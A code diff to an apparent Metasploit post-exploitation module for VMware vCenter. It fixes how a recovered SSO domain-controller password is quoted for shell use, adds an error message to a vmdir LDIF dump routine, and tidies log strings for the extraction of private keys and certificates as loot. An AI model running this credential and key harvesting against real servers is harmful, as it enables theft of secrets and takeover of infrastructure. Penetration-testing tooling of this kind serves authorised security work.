@@ -155,7 +155,10 @@ class MetasploitModule < Msf::Post
     end
 
     print_good("vSphere SSO DC PW: #{bind_pw}")
-    self.shell_bind_pw = "'#{bind_pw.gsub("'") { "\\'" }}'"
+    # clean up double quotes
+    # originally we wrapped in singles, but escaping of single quotes was not working, so prefer doubles
+    self.bind_pw = bind_pw.gsub('"') { '\\"' }
+    self.shell_bind_pw = "\"#{bind_pw}\""
 
     extra_service_data = {
       address: Rex::Socket.getaddress(rhost),
@@ -177,7 +180,10 @@ class MetasploitModule < Msf::Post
   def vmdir_dump
     print_status('Dumping vmdir schema to LDIF and storing to loot...')
     vmdir_ldif = get_ldif_contents(base_fqdn, vc_psc_fqdn, base_dn, bind_dn, shell_bind_pw)
-    return if vmdir_ldif.nil?
+    if vmdir_ldif.nil?
+      print_error('Error processing LDIF file')
+      return
+    end
 
     p = store_loot('vmdir', 'LDIF', rhost, vmdir_ldif, 'vmdir.ldif', 'vCenter vmdir LDIF dump')
     print_good("LDIF Dump: #{p}")
@@ -237,7 +243,7 @@ class MetasploitModule < Msf::Post
       print_bad("Could not extract #{store_label} private key")
     else
       p = store_loot(vecs_entry['Alias'], 'PEM', rhost, key.to_pem.to_s, "#{store_label}.key", "vCenter #{store_label} Private Key")
-      print_good("#{store_label} key: #{p}")
+      print_good("#{store_label} Key: #{p}")
     end
 
     vprint_status("Extract #{store_label} certificate ...")
@@ -247,7 +253,7 @@ class MetasploitModule < Msf::Post
       return
     end
     p = store_loot(vecs_entry['Alias'], 'PEM', rhost, cert.to_pem.to_s, "#{store_label}.pem", "vCenter #{store_label} Certificate")
-    print_good("#{store_label} cert: #{p}")
+    print_good("#{store_label} Cert: #{p}")
 
     unless key.nil?
       update_keystore(cert, key)
